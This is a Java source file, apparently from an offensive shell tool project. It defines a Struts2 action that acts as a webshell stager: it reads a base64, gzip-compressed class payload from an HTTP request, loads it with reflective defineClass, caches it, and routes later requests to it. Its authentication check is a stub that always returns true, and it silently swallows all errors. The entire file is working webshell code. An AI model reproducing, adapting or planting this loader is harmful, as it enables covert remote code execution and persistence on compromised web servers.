package com.reajason.noone.core.shelltool;

import javax.servlet.ServletOutputStream;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.*;
import java.lang.reflect.Method;
import java.net.URL;
import java.net.URLClassLoader;
import java.util.zip.GZIPInputStream;

public class NoOneStagingStruct2Action {

    private static volatile Class<?> adaptorClass = null;

    public NoOneStagingStruct2Action() {
    }

    public void execute() throws Exception {
        try {
            Class<?> clazz = Class.forName("com.opensymphony.xwork2.ActionContext");
            Object context = clazz.getMethod("getContext").invoke(null);
            Method getMethod = clazz.getMethod("get", String.class);
            HttpServletRequest request = (HttpServletRequest) getMethod.invoke(context, "com.opensymphony.xwork2.dispatcher.HttpServletRequest");
            HttpServletResponse response = (HttpServletResponse) getMethod.invoke(context, "com.opensymphony.xwork2.dispatcher.HttpServletResponse");
            try {
                if (adaptorClass != null) {
                    if (adaptorClass.newInstance().equals(new Object[]{request, response})) {
                        return;
                    }
                }
                if (isAuthed(request)) {
                    ServletOutputStream responseOutputStream = response.getOutputStream();
                    try {
                        if (adaptorClass == null) {
                            synchronized (NoOneStagingStruct2Action.class) {
                                if (adaptorClass == null) {
                                    byte[] payload = transformReqPayload(getArgFromRequest(request));
                                    byte[] bytes = gzipDecompress(decodeBase64(new String(payload, "UTF-8")));
                                    adaptorClass = reflectionDefineClass(bytes);
                                }
                            }
                        }
                        byte[] data = wrapResData(transformResData("ok".getBytes("UTF-8")));
                        responseOutputStream.write(data);
                    } catch (Throwable e) {
                        responseOutputStream.write(getStackTraceAsString(e).getBytes("UTF-8"));
                    }
                    wrapResponse(response);
                    responseOutputStream.flush();
                    responseOutputStream.close();
                }
            } catch (Throwable ignored) {
            }
        } catch (Throwable ignored) {
        }
    }

    private boolean isAuthed(Object request) {
        return true;
    }

    private byte[] getArgFromRequest(Object request) {
        return new byte[0];
    }

    private byte[] transformReqPayload(byte[] input) {
        return input;
    }

    private byte[] wrapResData(byte[] payload) {
        return payload;
    }

    private byte[] transformResData(byte[] payload) {
        return payload;
    }

    private void wrapResponse(Object response) {
    }

    public Class<?> reflectionDefineClass(byte[] classBytes) throws Exception {
        URLClassLoader urlClassLoader = new URLClassLoader(new URL[0], Thread.currentThread().getContextClassLoader());
        Method defMethod = ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, Integer.TYPE, Integer.TYPE);
        defMethod.setAccessible(true);
        return (Class<?>) defMethod.invoke(urlClassLoader, classBytes, 0, classBytes.length);
    }

    @SuppressWarnings("all")
    public static byte[] decodeBase64(String base64Str) throws Exception {
        Class<?> decoderClass;
        try {
            decoderClass = Class.forName("java.util.Base64");
            Object decoder = decoderClass.getMethod("getDecoder").invoke(null);
            return (byte[]) decoder.getClass().getMethod("decode", String.class).invoke(decoder, base64Str);
        } catch (Throwable e) {
            decoderClass = Class.forName("sun.misc.BASE64Decoder");
            return (byte[]) decoderClass.getMethod("decodeBuffer", String.class).invoke(decoderClass.newInstance(), base64Str);
        }
    }

    @SuppressWarnings("all")
    public static byte[] gzipDecompress(byte[] compressedData) throws IOException {
        ByteArrayOutputStream out = new ByteArrayOutputStream();
        GZIPInputStream gzipInputStream = null;
        try {
            gzipInputStream = new GZIPInputStream(new ByteArrayInputStream(compressedData));
            byte[] buffer = new byte[4096];
            int n;
            while ((n = gzipInputStream.read(buffer)) > 0) {
                out.write(buffer, 0, n);
            }
            return out.toByteArray();
        } finally {
            if (gzipInputStream != null) {
                gzipInputStream.close();
            }
            out.close();
        }
    }

    private String getStackTraceAsString(Throwable throwable) {
        StringWriter sw = new StringWriter();
        PrintWriter pw = new PrintWriter(sw);
        throwable.printStackTrace(pw);
        return sw.toString();
    }
}
